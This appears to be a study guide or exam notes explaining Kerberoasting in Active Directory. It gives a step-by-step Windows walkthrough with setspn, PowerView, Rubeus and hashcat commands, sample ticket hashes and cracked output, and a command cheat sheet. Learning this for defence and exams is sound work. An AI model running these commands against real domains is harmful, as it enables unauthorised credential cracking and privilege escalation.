## 1. What is Kerberoasting?

Kerberoasting is an Active Directory attack used to target **service accounts that have SPNs (Service Principal Names)**.

The attacker requests a Kerberos Service Ticket (TGS) for a service account and tries to crack it offline to recover its password.

**Simple example:**

Imagine an Active Directory domain has these accounts:

- Administrator
- John
- SAPService
- SQLService

SAPService and SQLService are service accounts with SPNs.

If we have valid domain-user credentials, we can request their TGS tickets and try to crack them using Hashcat.

If we recover a password, we can check what permissions that account has.

## 2. Important Terms

| Term | Easy explanation |
|---|---|
| Active Directory | Microsoft directory service for managing users and computers |
| SPN | Unique name that identifies a service running under an account |
| Service Account | Domain account used to run a service |
| TGT | Ticket Granting Ticket, used to request service tickets |
| TGS | Ticket Granting Service ticket, used to access a particular service |
| Kerberoasting | Requesting TGS tickets and cracking them offline |

**Remember:** Any authenticated domain user can normally request a TGS ticket for an SPN account. Special administrative privileges are not normally required.

## 3. Why do we perform Kerberoasting?

Our main objective is to:

1. Find accounts having SPNs.
2. Request their TGS tickets.
3. Extract the ticket hashes.
4. Crack the hashes offline.
5. Recover the account password.
6. Check whether the account has administrative privileges.

A service account may have high privileges, such as local administrator or Domain Admin.

## 4. Tools Used in Windows

| Tool | Purpose |
|---|---|
| setspn.exe | Find SPNs in Active Directory |
| PowerView | Enumerate domain users and SPNs |
| Rubeus | Request Kerberos TGS tickets |
| Hashcat | Crack extracted ticket hashes |
| Mimikatz | Work with and manipulate Kerberos tickets |

## 5. Performing Kerberoasting from Windows

### Step 1: Find SPNs using setspn.exe

Run in CMD:

```cmd
setspn -T INLANEFREIGHT.LOCAL -Q */*
```

Explanation:

- `-T` = Specify the domain.
- `-Q` = Search for SPNs.
- `*/*` = Search for all SPNs.

This shows accounts associated with registered SPNs.

### Step 2: Find SPN users using PowerView

First load PowerView in PowerShell:

```powershell
Import-Module .\PowerView.ps1
```

Find all users having SPNs:

```powershell
Get-DomainUser -SPN
```

Display only usernames and SPNs:

```powershell
Get-DomainUser -SPN |
Select-Object samaccountname, serviceprincipalname
```

Example output:

```text
samaccountname     serviceprincipalname
--------------     --------------------
SAPService         SAP/server.domain.local
SQLService         MSSQLSvc/sql01.domain.local
```

**What did we find?**

We found two accounts that have SPNs and can be investigated as Kerberoasting targets.

### Step 3: Request TGS tickets using Rubeus

Rubeus is used to request Kerberos tickets from Windows.

Request tickets for all SPN accounts:

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

Request a ticket for only one user:

```powershell
.\Rubeus.exe kerberoast /user:SAPService /outfile:sapservice.txt
```

Explanation:

- `kerberoast` = Perform Kerberoasting.
- `/user` = Target a specific account.
- `/outfile` = Save the extracted hashes into a file.

The output contains a hash similar to:

```text
$krb5tgs$23$*SAPService$DOMAIN.LOCAL$...
```

This is the ticket hash that we will try to crack.

### Step 4: Crack the ticket using Hashcat

Transfer the hash file to Kali or use Hashcat on your Windows machine.

For RC4 (etype 23) tickets:

```bash
hashcat -m 13100 sapservice.txt /usr/share/wordlists/rockyou.txt
```

Explanation:

- `-m 13100` = Kerberos 5 TGS-REP etype 23.
- `sapservice.txt` = File containing the ticket hash.
- `rockyou.txt` = Password dictionary.

Show recovered passwords:

```bash
hashcat -m 13100 sapservice.txt --show
```

Example result:

```text
SAPService:Password123
```

Now we have potentially recovered the service account password.

**Note:** Hashcat mode 13100 is specifically for RC4 etype 23. Other ticket encryption types require different modes.

### Step 5: Check account privileges

Now check which groups the service account belongs to.

Using PowerView:

```powershell
Get-DomainGroup -UserName SAPService
```

Using Windows CMD:

```cmd
net user SAPService /domain
```

Look for groups such as:

- Domain Admins
- Administrators
- Backup Operators
- Account Operators

If the account belongs to a privileged group, it could provide an opportunity for privilege escalation.

## 6. Complete Attack Flow

Remember this sequence:

```text
1. Find SPN accounts
       |
       v
2. Request TGS tickets
       |
       v
3. Save ticket hashes
       |
       v
4. Crack hashes using Hashcat
       |
       v
5. Recover password
       |
       v
6. Check account privileges
```

## 7. Important Commands – Quick Revision

| Task | Command |
|---|---|
| Find SPNs | `setspn -T DOMAIN -Q */*` |
| Find SPN users | `Get-DomainUser -SPN` |
| Display usernames and SPNs | `Get-DomainUser -SPN \| Select samaccountname, serviceprincipalname` |
| Request all TGS tickets | `Rubeus.exe kerberoast` |
| Request one user's ticket | `Rubeus.exe kerberoast /user:SAPService` |
| Save ticket hashes | `/outfile:kerberoast.txt` |
| Crack RC4 TGS | `hashcat -m 13100 hash.txt rockyou.txt` |
| Show cracked passwords | `hashcat -m 13100 hash.txt --show` |
| Check group membership | `Get-DomainGroup -UserName SAPService` |

## 8. Linux vs Windows Kerberoasting

| Linux | Windows |
|---|---|
| Impacket | Rubeus |
| `GetUserSPNs.py` | `Rubeus.exe kerberoast` |
| `-request` | `kerberoast` |
| `-outputfile` | `/outfile` |
| Hashcat | Hashcat |

Both methods perform the same basic attack. Only the tools and commands are different.

## 9. Important Points to Remember

- You need valid domain-user credentials or an appropriate domain-user security context.
- You do not need Domain Admin privileges to request normal SPN service tickets.
- Having an SPN does not automatically mean an account is privileged.
- Getting a TGS ticket does not mean you have cracked its password.
- Password cracking happens offline.
- A strong service-account password makes Kerberoasting much harder.
- A successful crack does not automatically provide administrative access. Check the account's actual permissions.

**One-line definition for exams:**

Kerberoasting is an Active Directory attack in which an authenticated domain user requests TGS tickets for SPN-associated accounts and attempts to crack them offline to recover their passwords.
